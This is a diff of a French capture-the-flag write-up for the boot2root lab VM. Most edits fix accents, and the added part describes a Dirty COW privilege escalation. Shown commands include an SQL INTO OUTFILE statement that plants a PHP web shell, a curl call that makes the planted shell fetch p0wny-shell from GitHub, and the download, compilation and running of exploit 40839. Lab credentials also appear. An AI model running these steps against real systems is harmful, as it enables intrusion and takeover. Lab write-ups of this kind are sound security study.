@@ -3,24 +3,24 @@
 ## Contexte
 
 Comme nous avons vu dans l'ancien writeup, il
-nous a ete possible de devenir **root** en remplacant
+nous a été possible de devenir **root** en remplaçant
 simplement le binaire d'**init** par un shell dans les paramètres
 kernel.
 
 ## Collecte d'informations
 
 En ouvrant notre navigateur internet, dans notre cas firefox, il
-est possible d'acceder au site internet HTTPS en ajoutant une exception
+est possible d'accéder au site internet HTTPS en ajoutant une exception
 SSL.
 
-En utilisant le logiciel **OWASP ZAP**, nous avons pu determiner
+En utilisant le logiciel **OWASP ZAP**, nous avons pu déterminer
 l'existence de plusieurs sous dossier du serveur HTTP:
 - /forum
 - /phpmyadmin
 
 ### Analyse du forum
 
-Les forums utilisent en general des generateurs de page HTML;
+Les forums utilisent en général des générateurs de page HTML;
 ceux-ci ajoutant leurs versions dans la balise meta "generator":
 
 ```bash
@@ -34,15 +34,15 @@ Ce qui nous donne:
 ```
 
 D'autre part un naviguant sur le forum nous avons pu observe
-la presence d'un topic intéressant a propos d'un *Probleme login*.
-Le contenu du post possede la meme nomenclature du fichier de log SSH.
+la présence d'un topic intéressant a propos d'un *Problème login*.
+Le contenu du poste possède la même nomenclature du fichier de log SSH.
 
-En lisant meticuleusement l'extrait du fichier, une ligne nous saute au yeux:
+En lisant méticuleusement l'extrait du fichier, une ligne nous saute au yeux:
 
 `Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2`
 
 Le nom de l'utilisateur qui se serait trompe lors de sa connection s'apparente plus a un mot de passe,
-une etourderie de la part de l'utilisateur peut etre ? En regardant la tentative
+une étourderie de la part de l'utilisateur peut être ? En regardant la tentative
 juste en dessous, nous pouvons apercevoir l'username **lmezard**:
 
 `Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)`
@@ -51,7 +51,7 @@ En testant de se connecter sur le forum avec:
 - username: `lmezard`
 - password: `!q\]Ej?*5K5cy*AJ`
 
-Il est possible d'acceder au compte et d'avoir acces a plus d'informations a propos de l'utilisateur:
+Il est possible d'accéder au compte et d'avoir accès a plus d'informations a propos de l'utilisateur:
 
 ![Boot Menu](https://raw.githubusercontent.com/deville-m/boot2root/master/.github/forum.png)
 
@@ -59,8 +59,8 @@ Nous sommes en possession du mail de l'utilisateur: `laurie@borntosec.net`
 
 ### Le serveur IMAP
 
-Lors du premier writeup, nous avons mis en evidence la presence d'un serveur IMAP
-sur la VM, connectons nous sur le port securise:
+Lors du premier writeup, nous avons mis en évidence la présence d'un serveur IMAP
+sur la VM, connectons nous sur le port sécurisé:
 
 ```bash
 openssl s_client -connect $TARGET:993
@@ -188,7 +188,7 @@ nous pouvons utiliser les credentials pour se connecter:
 ![phpmyadmin](https://raw.githubusercontent.com/deville-m/boot2root/master/.github/phpmyadmin.png)
 
 En se basant sur cet [article](http://www.informit.com/articles/article.aspx?p=1407358&seqNum=2) nous allons
-mettre en place un shell pour executer des commandes a distance:
+mettre en place un shell pour exécuter des commandes a distance:
 
 ```sql
 select "<?php $o = shell_exec($_REQUEST['x']); echo $o ?>" into outfile "/var/www/x.php";
@@ -199,7 +199,7 @@ Seulement le serveur nous renvois une erreur:
 #1 - Can't create/write to file '/var/www/x.php' (Errcode: 13)
 ```
 
-Il nous faut un dossier dans lequel nous avons les droits d'ecriture.
+Il nous faut un dossier dans lequel nous avons les droits d'écriture.
 En lisant la [documentation](https://github.com/ilosuna/mylittleforum/wiki/Installation) d'installation
 du forum:
 
@@ -213,7 +213,7 @@ select "<?php $o = shell_exec($_REQUEST['x']); echo $o ?>" into outfile "/var/ww
 
 ![phpmyadmin](https://raw.githubusercontent.com/deville-m/boot2root/master/.github/phpmyadmin2.png)
 
-Succes ! Nous pouvons desormais installer un shell plus fancy:
+Succès ! Nous pouvons désormais installer un shell plus fancy:
 
 ```bash
 curl -sk "https://$TARGET/forum/templates_c/foo.php?x=curl -O https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php"
@@ -225,12 +225,13 @@ Un nouveau jeu de credentials ! `lmezard:G!@M6f4Eatau{sF"`
 
 ### FTP
 
-En testant les identifiants sur le serveur FTP,
-nous avons acces a un dossier:
+En testant les identifiant sur le serveur FTP,
+nous avons accès a un dossier:
 
 ![ftp](https://raw.githubusercontent.com/deville-m/boot2root/master/.github/ftp.png)
 
 Nous telechargeons son contenu:
+
 ```
 $ cat README
 Complete this little challenge and use the result as password for user 'laurie' to login in ssh
@@ -273,7 +274,7 @@ $ cat 01IXJ.pcap
 //file265
 ```
 
-Les fichiers sont en realite un seul fichier source C fragmente. A l'aide du commentaire de la derniere ligne de chaque fichier, on peut recuperer le l'ordre reel des fichiers.
+Les fichiers sont en réalité un seul fichier source C fragmente. A l'aide du commentaire de la dernière ligne de chaque fichier, on peut récupérer le l'ordre réel des fichiers.
 
 ```
 $ ./scripts/lmezard_ftp.py ft_fun > res.c
@@ -289,6 +290,9 @@ $ printf "Iheartpwnage" | openssl sha -sha256
 ```
 
 ### SSH (laurie)
+
+Nous pouvons distinguer l'existence d'un crack-me dans
+le $HOME de laurie.
 
 ```
 $ ssh laurie@$TARGET
@@ -314,3 +318,33 @@ NO SPACE IN THE PASSWORD (password is case sensitive).
 $ file bomb
 bomb: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.0.0, not stripped
 ```
+
+Sachant que nous avons un shell stable, il est possible
+de récupérer plus d'informations sur le système:
+
+```bash
+laurie@BornToSecHackMe:~$ uname -smr
+Linux 3.2.0-91-generic-pae i686
+```
+
+En 2016, la vulnérabilité [Dirty Cow](https://www.wikiwand.com/fr/Dirty_COW) a été découverte et mise
+publique. Le kernel étant assez ancien, nous allons rechercher quelques exploits avec `searchsploit`.
+
+```bash
+$ searchsploit "Linux Kernel < 3. Dirty"
+```
+
+![Searchsploit](https://raw.githubusercontent.com/deville-m/boot2root/master/.github/searchsploit.png)
+
+Apres plusieurs tests, nous avons choisis l'exploit [**40839**](https://www.exploit-db.com/exploits/40839):
+
+```bash
+$ curl https://www.exploit-db.com/raw/40839 -o dirty.c
+$ sed -i s/firefart/root/ dirty.c # Change l'id de l'user
+$ gcc -pthread dirty.c -o dirty -lcrypt
+$ ./dirty 42
+```
+
+![Searchsploit](https://raw.githubusercontent.com/deville-m/boot2root/master/.github/dirty.png)
+
+Nous sommes en possession d'un shell en *uid=0*.
